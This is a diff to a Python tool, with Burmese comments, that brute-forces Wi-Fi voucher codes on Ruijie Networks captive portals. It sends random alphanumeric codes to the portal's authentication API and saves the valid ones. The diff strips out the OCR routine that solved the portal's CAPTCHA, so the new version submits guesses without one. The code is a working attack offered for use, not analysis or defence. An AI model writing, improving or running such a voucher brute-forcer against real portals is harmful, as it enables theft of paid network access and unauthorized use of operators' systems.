@@ -7,14 +7,11 @@ import string
 import sys
 import time
 import httpx
-import cv2
-import ddddocr
-import numpy as np
 import re as import_re
 import asyncio
 
 # ====================================================
-# 🌟 RUIJIE ELITE SUITE [AUTO-CONNECTION & GATEKEEPER v9.1]
+# 🌟 RUIJIE ELITE SUITE [NO-CAPTCHA PURE RANDOM v9.2]
 # ====================================================
 
 C_CYAN = "\033[96m"
@@ -31,40 +28,12 @@ def clear_screen():
 
 def banner():
     print(f"{C_CYAN}{C_BOLD}╔══════════════════════════════════════════════════╗{C_RESET}")
-    print(f"{C_CYAN}{C_BOLD}║{C_MAGENTA}          ⚡ RUIJIE ELITE SUITE v9.1 ⚡           {C_CYAN}{C_BOLD}║{C_RESET}")
-    print(f"{C_CYAN}{C_BOLD}║{C_YELLOW}        [ Wi-Fi Gatekeeper & Wifidog Engine ]      {C_CYAN}{C_BOLD}║{C_RESET}")
+    print(f"{C_CYAN}{C_BOLD}║{C_MAGENTA}          ⚡ RUIJIE ELITE SUITE v9.2 ⚡           {C_CYAN}{C_BOLD}║{C_RESET}")
+    print(f"{C_CYAN}{C_BOLD}║{C_YELLOW}        [ No-Captcha Pure Random Engine ]          {C_CYAN}{C_BOLD}║{C_RESET}")
     print(f"{C_CYAN}{C_BOLD}╚══════════════════════════════════════════════════╝{C_RESET}")
 
-# --- OCR & Captcha Helpers ---
-_ocr = None
-def get_ocr():
-    global _ocr
-    if _ocr is None:
-        try:
-            _ocr = ddddocr.DdddOcr(show_ad=False)
-        except:
-            _ocr = None
-    return _ocr
-
-def _ocr_sync(image_bytes):
-    ocr = get_ocr()
-    if ocr is None:
-        return None
-    try:
-        nparr = np.frombuffer(image_bytes, np.uint8)
-        img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
-        if img is None:
-            return None
-        gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
-        blur = cv2.GaussianBlur(gray, (3, 3), 0)
-        _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
-        _, buffer = cv2.imencode('.png', thresh)
-        return ocr.classification(buffer.tobytes()).upper()
-    except:
-        return None
-
 async def verify_wifi_connection():
-    """Wi-Fi Portal နှင့် အမှန်တကယ် ချိတ်ဆက်ထားခြင်း ရှိမရှိ စစ်ဆေးခြင်း"""
+    """Wi-Fi Portal နှင့် ချိတ်ဆက်ထားခြင်း ရှိမရှိ စစ်ဆေးခြင်း"""
     print(f"\n{C_YELLOW}⚙️ [Gatekeeper] Checking Wi-Fi Captive Portal connection...{C_RESET}")
     test_urls = [
         "http://portal-mm-as.ruijienetworks.com/api/auth/wifidog",
@@ -77,7 +46,6 @@ async def verify_wifi_connection():
             try:
                 resp = await client.get(url)
                 final_url = str(resp.url)
-                # Portal လိပ်စာ သို့မဟုတ် Captive portal တုံ့ပြန်မှုကို တွေ့ရှိပါက
                 if "portal" in final_url or "stage=portal" in final_url or resp.status_code < 500:
                     print(f"{C_GREEN} ✅ Connected! Active Portal Found: {final_url}{C_RESET}")
                     return final_url
@@ -85,7 +53,6 @@ async def verify_wifi_connection():
                 continue
                 
     print(f"{C_RED} ❌ Wi-Fi Portal သို့ ချိတ်ဆက်ထားခြင်း မရှိပါ (သို့မဟုတ်) လိပ်စာ ရှာမတွေ့ပါ။{C_RESET}")
-    print(f"{C_RED} ⚠️ Wi-Fi ချိတ်ဆက်ပြီးမှသာ Voucher ရှာဖွေခွင့် ပြုမည်ဖြစ်သည်။{C_RESET}")
     return None
 
 async def get_session_id(client, session_url):
@@ -99,10 +66,6 @@ async def get_session_id(client, session_url):
         match = import_re.search(r'[?&]sessionId=([a-zA-Z0-9]+)', final_url)
         if match:
             return match.group(1)
-        text = resp.text
-        html_match = import_re.search(r"sessionId['\"]?\s*[:=]\s*['\"]([a-zA-Z0-9]+)['\"]", text)
-        if html_match:
-            return html_match.group(1)
     except Exception:
         pass
     return None
@@ -121,25 +84,10 @@ async def verify_and_check(session_url, code):
             if not session_id:
                 return False
             
-            cap_url = f"https://portal-as.ruijienetworks.com/api/auth/captcha/image?sessionId={session_id}&_t={time.time()}"
-            cap_resp = await client.get(cap_url)
-            if cap_resp.status_code != 200:
-                return False
-            
-            auth_text = await asyncio.to_thread(_ocr_sync, cap_resp.content)
-            if not auth_text:
-                return False
-            
-            verify_url = "https://portal-as.ruijienetworks.com/api/auth/captcha/verify"
-            v_resp = await client.post(verify_url, json={'sessionId': session_id, 'authCode': auth_text})
-            if v_resp.status_code != 200 or not v_resp.json().get("success"):
-                return False
-            
             payload = {
                 "accessCode": code,
                 "sessionId": session_id,
-                "apiVersion": 1,
-                "authCode": auth_text
+                "apiVersion": 1
             }
             resp = await client.post(post_url, json=payload, headers=headers)
             res_text = resp.text
@@ -155,7 +103,7 @@ def save_code(code):
         f.write(f"[{timestamp}] CODE: {code}\n")
 
 def terminal_scanner(portal_url):
-    print(f"\n{C_GREEN}🚀 [Scanner Active] Pure Random Wifidog Engine{C_RESET}\n")
+    print(f"\n{C_GREEN}🚀 [Scanner Active] Pure Random Engine (No Captcha){C_RESET}\n")
     print(f"{C_CYAN}--------------------------------------------------{C_RESET}")
     
     chars = string.ascii_lowercase + string.ascii_uppercase + string.digits
@@ -210,7 +158,7 @@ def main_menu():
         print(f"{C_WHITE}│{C_CYAN}  [2] ⚡ Start Pure Random Voucher Scanner        {C_WHITE}│{C_RESET}")
         print(f"{C_WHITE}│{C_CYAN}  [3] 📂 View Saved Valid Codes Archive           {C_WHITE}│{C_RESET}")
         print(f"{C_WHITE}│{C_CYAN}  [4] 🧹 Clear Saved Codes History                {C_RESET}│{C_RESET}")
-        print(f"{C_WHITE}│{C_CYAN}  [5] 🚀 Exit & System Boost                      {C_WHITE}│{C_RESET}")
+        print(f"{C_WHITE}│{C_CYAN}  [5] 🚀 Exit & System Boost                      {C_RESET}│{C_RESET}")
         print(f"{C_WHITE}└──────────────────────────────────────────────────┘{C_RESET}")
         
         if active_portal:
@@ -226,7 +174,6 @@ def main_menu():
         elif choice == '2':
             if not active_portal:
                 print(f"\n{C_RED} ❌ [Error] Wi-Fi Portal သို့ မချိတ်ဆက်ရသေးပါ။{C_RESET}")
-                print(f"{C_RED} ⚠️ ကျေးဇူးပြု၍ ဦးစွာ Option [1] ကိုနှိပ်ပြီး Portal ချိတ်ဆက်မှုကို အတည်ပြုပါ!{C_RESET}")
             else:
                 terminal_scanner(active_portal)
             input(f"\n{C_CYAN}Press Enter to return...{C_RESET}")
@@ -255,3 +202,4 @@ def main_menu():
 
 if __name__ == "__main__":
     main_menu()
+            
